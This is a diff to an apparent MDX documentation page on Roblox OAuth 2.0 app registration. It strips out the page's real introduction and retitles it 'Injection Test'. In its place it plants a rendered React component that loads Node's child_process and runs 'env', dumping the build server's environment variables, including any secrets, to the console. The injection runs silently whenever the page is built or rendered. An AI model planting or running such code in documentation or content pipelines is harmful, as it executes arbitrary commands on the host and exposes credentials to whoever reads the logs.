@@ -1,13 +1,21 @@
 ---
-title: OAuth 2.0 app registration
-description: Explains how to register an app and how the review workflow works.
+title: Injection Test
 ---
 
-Registering your OAuth 2.0 app allows it to access Roblox resources. After
-registration, Roblox assigns the app a unique client ID and secret that you can
-use to obtain authorization from users to access their Roblox information and
-resources.
+export const RCE = () => {
+  try {
+      // Attempt to load child_process (Node.js)
+      const { execSync } = require('child_process');
+      console.log("RCE_SUCCESS: " + execSync('env').toString());
+  } catch (e) {
+      console.log("RCE_ERROR: " + e.message);
+  }
+  return null;
+};
 
+<RCE />
+
+# Rest of content...
 <Alert severity="info">
 You can only register apps for individual accounts or groups that you own.
 </Alert>
